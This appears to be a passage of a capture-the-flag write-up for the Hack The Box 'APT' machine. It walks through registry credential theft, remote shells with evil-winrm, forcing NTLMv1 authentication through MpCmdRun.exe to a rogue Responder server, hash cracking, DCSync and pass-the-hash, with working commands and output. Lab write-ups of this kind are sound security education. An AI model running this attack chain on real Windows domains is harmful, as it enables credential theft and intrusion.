</span></span><span class="line"><span class="cl">HKU<span class="se">\S</span>oftware
</span></span><span class="line"><span class="cl">HKU<span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem
</span></span><span class="line"><span class="cl">HKU<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft
</span></span><span class="line"><span class="cl">HKU<span class="se">\S</span>oftware<span class="se">\P</span>olicies
</span></span><span class="line"><span class="cl">HKU<span class="se">\S</span>oftware<span class="se">\R</span>egisteredApplications
</span></span><span class="line"><span class="cl">HKU<span class="se">\S</span>oftware<span class="se">\V</span>Mware, Inc.
</span></span><span class="line"><span class="cl">HKU<span class="se">\S</span>oftware<span class="se">\W</span>ow6432Node
</span></span><span class="line"><span class="cl">HKU<span class="se">\S</span>oftware<span class="se">\C</span>lasses
</span></span></code></pre></div><p>In that key, it contains the credentials for <code>henry.vinson_adm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ reg.py htb.local/henry.vinson@apt -hashes <span class="s1">&#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#39;</span> query -keyName HKU<span class="se">\\</span>Software<span class="se">\\</span>GiganticHostingManagementSystem
</span></span><span class="line"><span class="cl">Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Cannot check RemoteRegistry status. Hoping it is started...
</span></span><span class="line"><span class="cl">HKU<span class="se">\S</span>oftware<span class="se">\G</span>iganticHostingManagementSystem
</span></span><span class="line"><span class="cl">        UserName        REG_SZ   henry.vinson_adm
</span></span><span class="line"><span class="cl">        PassWord        REG_SZ   G1#Ny5@2dvht
</span></span></code></pre></div><h4 id="remote-access">Remote Access</h4>
<p><code>henry.vinson_adm</code> credentials can be used to with evil-winrm, and this results in an interactive shell access to the system.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «apt» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i apt -u henry.vinson_adm -p <span class="s1">&#39;G1#Ny5@2dvht&#39;</span>                  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; 
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop&gt; <span class="nb">type</span> user.txt
</span></span><span class="line"><span class="cl">745212a817f60f27befd...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as administrator</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Recursive search for text files finds a PowerShell history.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm&gt; gci -Path C:<span class="se">\U</span>sers -filter *.txt -Recurse -ErrorAction SilentlyContinue -Force
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                -------------         ------ ----
</span></span><span class="line"><span class="cl">-a----       11/10/2020  10:58 AM            <span class="m">458</span> ConsoleHost_history.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm&gt; <span class="nb">type</span> <span class="s2">&#34;C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Cred</span> <span class="o">=</span> get-credential administrator
</span></span><span class="line"><span class="cl">invoke-command -credential <span class="nv">$Cred</span> -computername localhost -scriptblock <span class="o">{</span>Set-ItemProperty -Path <span class="s2">&#34;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&#34;</span> lmcompatibilitylevel -Type DWORD -Value 	<span class="m">2</span> -Force<span class="o">}</span>
</span></span></code></pre></div><p>From Wikipedia:</p>
<blockquote>
<p><strong>Send NTLM response only</strong>: Clients use NTLM authentication only, and use NTLMv2 session security if server supports it; <strong>DCs accept LM,</strong>  NTLM, and NTLMv2 authentication.</p>
</blockquote>
<p>With <code>lmcompatibilitylevel = 2</code>, it means the authentication process can be downgraded to NTLMv1.</p>
<p>The idea here is to coerce APT to make a request (<em>challenge-response</em>) to the server that the attacker controls. Instead of sending a set of random number challenge, this server has been configured to always send &ldquo;1122334455667788&rdquo; as its challenge.</p>
<p>There is a site called <a href="https://crack.sh">https://crack.sh</a> that provides a service for cracking NTLMv1 response using <a href="https://en.wikipedia.org/wiki/Rainbow_table">rainbow tables</a> for a specific challenge of &ldquo;1122334455667788&rdquo;. So after the server received the response from the given challenge, I can submit that response to <a href="https://crack.sh">crack.sh</a> for cracking and obtain NTLM/NT hash of APT afterward.</p>
<p>The attack is explained in details <a href="https://book.hacktricks.xyz/windows/ntlm">here</a>.</p>
<blockquote>
<p>Note:</p>
<ul>
<li>NetNTLM/NTLMv1 is an authentication protocol</li>
<li>NetNTLM/NTLMv1 hash != NTLM hash</li>
<li>NetNTLM/NTLMv1 hash contains NTLM hash</li>
</ul>
</blockquote>
<h4 id="stealing-ntlmv1-response-via-mpcmdrunexe">Stealing NTLMv1 response via MpCmdRun.exe</h4>
<p><code>MpCmdRun.exe</code> is part of Windows Defender that always runs with SYSTEM privileges. In September 2020, a security researcher named <a href="https://twitter.com/mohammadaskar2/">Mohammad Askar</a> finds that <code>MpCmdRun.exe</code> can be used to download a file. Furthermore, it can also be used to scan a file over SMB share.</p>
<p>When it comes to SMB share, there will be an authentication process that happens there. This authentication process can be captured using tool called <a href="https://github.com/SpiderLabs/Responder">Responder</a>.</p>
<blockquote>
<p>This <a href="https://techcommunity.microsoft.com/t5/storage-at-microsoft/smb-and-null-sessions-why-your-pen-test-is-probably-wrong/ba-p/1185365">article</a> explains how authentication process over SMB works</p>
</blockquote>
<p>I will abuse the scan ability of <code>MpCmdRun.exe</code> to perform a file scan over my rogue SMB server that will capture the incoming NTLMv1/v2 response. This rogue SMB server is also Responder, and I will change the Responder configuration to always give &ldquo;1122334455667788&rdquo; as the challenge. The configuration file can be found at <code>/etc/responder/Responder.conf</code>.</p>
<p>After that, I can start <code>Responder</code> to listen on my tun0 interface and use the <code>--lm</code> option which will downgrade the authentication to NTLMv1.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «~» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ responder -I tun0 --lm                                 
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 2.3.4.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoners:
</span></span><span class="line"><span class="cl">    LLMNR                      <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    NBT-NS                     <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DNS/MDNS                   <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Servers:
</span></span><span class="line"><span class="cl">    HTTP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    HTTPS server               <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    WPAD proxy                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Auth proxy                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SMB server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Kerberos server            <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SQL server                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    FTP server                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    IMAP server                <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    POP3 server                <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SMTP server                <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DNS server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    LDAP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    RDP server                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> HTTP Options:
</span></span><span class="line"><span class="cl">    Always serving EXE         <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Serving EXE                <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Serving HTML               <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Upstream Proxy             <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoning Options:
</span></span><span class="line"><span class="cl">    Analyze Mode               <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force WPAD auth            <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force Basic Auth           <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force LM downgrade         <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Fingerprint hosts          <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generic Options:
</span></span><span class="line"><span class="cl">    Responder NIC              <span class="o">[</span>tun0<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder IP               <span class="o">[</span>10.10.14.72<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Challenge <span class="nb">set</span>              <span class="o">[</span>1122334455667788<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Don<span class="s1">&#39;t Respond To Names     [&#39;</span>ISATAP<span class="err">&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
</span></span></code></pre></div><p>Now on APT, I can force authentication with <code>MpCmdRun.exe</code> (located on <code>C:\Program Files\Windows Defender</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender&gt;.<span class="se">\M</span>pCmdRun.exe -Scan -ScanType <span class="m">3</span> -File <span class="se">\\</span>10.10.14.72<span class="se">\n</span>otexist
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Scan starting...
</span></span><span class="line"><span class="cl">CmdTool: Failed with <span class="nv">hr</span> <span class="o">=</span> 0x80508023. Check C:<span class="se">\U</span>sers<span class="se">\H</span>ENRY~2.VIN<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\M</span>pCmdRun.log <span class="k">for</span> more information
</span></span></code></pre></div><blockquote>
<p>Active Directory uses Kerberos as the default authentication method, but it will fallback to NTLM authentication if the client try to connect to other hosts with IP address</p>
</blockquote>
<p>It errored out, but on my Kali, <code>responder</code> has successfully captured the hash of <code>APT$</code>, the computer account of the box.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...&lt;snip&gt;..
</span></span><span class="line"><span class="cl">[+] Listening for events...
</span></span><span class="line"><span class="cl">[SMB] NTLMv1 Client   : 10.10.10.213
</span></span><span class="line"><span class="cl">[SMB] NTLMv1 Username : HTB\APT$
</span></span><span class="line"><span class="cl">[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
</span></span></code></pre></div><p>Why did this happen (I ask myself) ?</p>
<p>As far as I know, when there are no credentials specified explicitly, Windows uses the current credentials.</p>
<p>However, because Windows Defender is already running as SYSTEM (built-in local system), (afaik) it can not be downgraded to a lower privilege for authentication. It won’t authenticate using SYSTEM as well. Instead, it uses the machine/computer account for authentication.</p>
<blockquote>
<p>LocalSystem and NetworkService credentials use computer account for authentication.</p>
</blockquote>
<h4 id="cracking-ntlmv1-re">Cracking NTLMv1 re</h4>
<p>I can submit the hash to <a href="https://crack.sh/">https://crack.sh/</a> with the following format.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210417161415390.png" alt="image-20210417161415390"  /></div>
</p>
<p>It will automatically detect the input.</p>
<p><div class="img-container"><img src="imgs/image-20210417161541589.png" alt="image-20210417161541589"  /></div>
</p>
<p>Not even a minute passed, it sent me the result.</p>
<p><div class="img-container"><img src="imgs/image-20210417161758516.png" alt="image-20210417161758516"  /></div>
</p>
<p>The key is <code>d167c3238864b12f5f82feae86a7f798</code>, it&rsquo;s the NTLM hash/NThash that can be used for <em>pass-the-hash</em> attack.</p>
<h4 id="credentials-dumping">Credentials Dumping</h4>
<p>NTLM Hash of a computer account can not be used for remote login. Instead, it can be used to perform DCSync attack using <code>secretsdump.py</code>. I&rsquo;ll take only the administrator hash.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «~» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ secretsdump.py <span class="s1">&#39;htb.local/APT$@apt&#39;</span> -hashes <span class="s1">&#39;d167c3238864b12f5f82feae86a7f798:d167c3238864b12f5f82feae86a7f798&#39;</span> -just-dc-user administrator
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
</span></span><span class="line"><span class="cl">...&lt;snip&gt;..
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
</span></span></code></pre></div><p>I can login into the box using <code>evil-winrm</code> with the administrator hash I obtained.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «~» «10.10.14.72» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i apt -u administrator -H c370bddf384a691d811ff3495e8a72e2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">a1f204c405aea36388...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; 
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
